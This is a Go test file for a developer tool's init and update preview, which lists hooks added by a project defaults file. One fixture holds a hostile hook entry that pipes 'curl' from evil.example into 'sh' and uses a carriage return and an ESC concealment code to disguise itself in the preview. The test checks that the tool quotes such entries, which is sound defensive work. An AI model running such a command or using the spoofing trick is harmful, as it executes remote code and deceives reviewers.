package devinit

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/internal/catalog"
	"github.com/Quantum-Serendipity/qsdev/internal/testutil"
	"github.com/Quantum-Serendipity/qsdev/pkg/branding"
)

// previewOverlay is a project defaults file that adds a custom hook and an
// always-on security hook.
const previewOverlay = `security_hooks:
  - foo-hook
custom_hooks:
  - id: okhook
    name: OK hook
    description: project hook
    entry: ./check.sh
    language: system
    pass_filenames: false
    stages: [pre-commit]
`

// previewRun is one way a person reaches the init or update plan.
type previewRun struct {
	name string
	// initFirst creates the project before the run under test.
	initFirst bool
	run       func(t *testing.T, dir string) (string, error)
}

func previewRuns() []previewRun {
	initWith := func(args ...string) func(*testing.T, string) (string, error) {
		return func(t *testing.T, dir string) (string, error) {
			t.Helper()
			return executeInitCmd(t, dir, args...)
		}
	}
	return []previewRun{
		{name: "init", run: initWith("--yes", "--lang", "go")},
		{name: "init --dry-run", run: initWith("--yes", "--dry-run", "--lang", "go")},
		{name: "init --update", initFirst: true, run: initWith("--update", "--yes")},
		{name: "init --update --dry-run", initFirst: true, run: initWith("--update", "--dry-run", "--yes")},
		{name: "init on a set-up project", initFirst: true, run: initWith("--yes", "--force", "--lang", "go")},
		{name: "update", initFirst: true, run: updateWith("--configs-only", "--skip-container")},
		{name: "update --dry-run", initFirst: true, run: updateWith("--configs-only", "--skip-container", "--dry-run")},
	}
}

// updateWith returns a run that executes `update` with args in dir. The
// rows pass --configs-only: the config-regeneration stage of update, without
// the binary and devenv-input stages, which reach the network.
func updateWith(args ...string) func(*testing.T, string) (string, error) {
	return func(t *testing.T, dir string) (string, error) {
		t.Helper()
		t.Chdir(dir)
		return executeUpdate(args)
	}
}

// executeUpdate runs the update command with args in the working directory
// and returns its combined output.
func executeUpdate(args []string) (string, error) {
	cmd := updateCmd()
	var buf bytes.Buffer
	cmd.SetOut(&buf)
	cmd.SetErr(&buf)
	cmd.SetArgs(args)
	err := cmd.Execute()
	return buf.String(), err
}

// setupPreviewProject makes an isolated project, with overlay as its project
// defaults file when it is not empty, and points the catalog at it.
// It returns the project directory and the defaults file path.
func setupPreviewProject(t *testing.T, overlay string) (dir, path string) {
	t.Helper()
	dir = testutil.IsolatedDir(t)
	path = catalog.ProjectConfigPath(dir)
	if overlay != "" {
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(overlay), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	catalog.ResetDefault()
	t.Cleanup(catalog.ResetDefault)
	if err := catalog.SetProjectRoot(dir); err != nil {
		t.Fatal(err)
	}
	return dir, path
}

// runPreview runs tt in a fresh project with overlay as its project defaults
// file ("" for none) and returns the output of the run under test.
func runPreview(t *testing.T, tt previewRun, overlay string) (out, path string) {
	t.Helper()
	dir, path := setupPreviewProject(t, overlay)
	if tt.initFirst {
		if out, err := executeInitCmd(t, dir, "--yes", "--lang", "go"); err != nil {
			t.Fatalf("init: %v\n%s", err, out)
		}
	}
	out, err := tt.run(t, dir)
	if err != nil {
		t.Fatalf("%s: %v\n%s", tt.name, err, out)
	}
	return out, path
}

// TestInitPreviewListsOverlayHooks: every init and update path names the
// project defaults file and each hook it adds, with the hook's section and
// the command it runs, exactly once.
func TestInitPreviewListsOverlayHooks(t *testing.T) {
	// Not parallel: the working directory and the global catalog are
	// process-wide.
	t.Setenv(branding.Get().EnvPrefix+"ORG_CONFIG", "")
	for _, tt := range previewRuns() {
		t.Run(tt.name, func(t *testing.T) {
			out, path := runPreview(t, tt, previewOverlay)
			for _, want := range []string{
				"Project defaults: " + path + "\n",
				"  adds pre-commit hook foo-hook (security_hooks)\n",
				"  adds pre-commit hook okhook (custom_hooks): ./check.sh\n",
			} {
				if n := strings.Count(out, want); n != 1 {
					t.Errorf("output has %q %d times, want once:\n%s", want, n, out)
				}
			}
		})
	}
}

// TestInitPreviewNoOverlayPrintsNothingExtra: without a project defaults
// file, no path prints a project defaults line or a hook addition.
func TestInitPreviewNoOverlayPrintsNothingExtra(t *testing.T) {
	// Not parallel: the working directory and the global catalog are
	// process-wide.
	t.Setenv(branding.Get().EnvPrefix+"ORG_CONFIG", "")
	for _, tt := range previewRuns() {
		t.Run(tt.name, func(t *testing.T) {
			out, _ := runPreview(t, tt, "")
			for _, unwanted := range []string{"Project defaults:", "adds pre-commit hook"} {
				if strings.Contains(out, unwanted) {
					t.Errorf("output mentions %q without a project defaults file:\n%s", unwanted, out)
				}
			}
		})
	}
}

// hostileEntryOverlay is a project defaults file whose custom hook entry
// tries to rewrite its own preview line: a carriage return returns the
// cursor so a decoy overwrites the real command, and ESC[8m conceals the
// output after it.
const hostileEntryOverlay = `custom_hooks:
  - id: okhook
    name: OK hook
    entry: "curl -s https://evil.example/x | sh\r  adds pre-commit hook okhook (custom_hooks): ./check.sh   \u001b[8m"
    language: system
    pass_filenames: false
    stages: [pre-commit]
`

// TestInitPreviewQuotesHostileHookEntry: a hook entry holding a control
// character is shown quoted, so the preview line shows the command the hook
// runs and cannot be rewritten or concealed by the repository that supplies
// it.
func TestInitPreviewQuotesHostileHookEntry(t *testing.T) {
	// Not parallel: the working directory and the global catalog are
	// process-wide.
	t.Setenv(branding.Get().EnvPrefix+"ORG_CONFIG", "")
	for _, tt := range previewRuns() {
		t.Run(tt.name, func(t *testing.T) {
			out, _ := runPreview(t, tt, hostileEntryOverlay)
			want := `  adds pre-commit hook okhook (custom_hooks): "curl -s https://evil.example/x | sh\r  adds pre-commit hook okhook (custom_hooks): ./check.sh   \x1b[8m"` + "\n"
			if n := strings.Count(out, want); n != 1 {
				t.Errorf("output has %q %d times, want once:\n%s", want, n, out)
			}
			if strings.ContainsAny(out, "\r\x1b") {
				t.Errorf("output holds a raw CR or ESC byte:\n%q", out)
			}
		})
	}
}
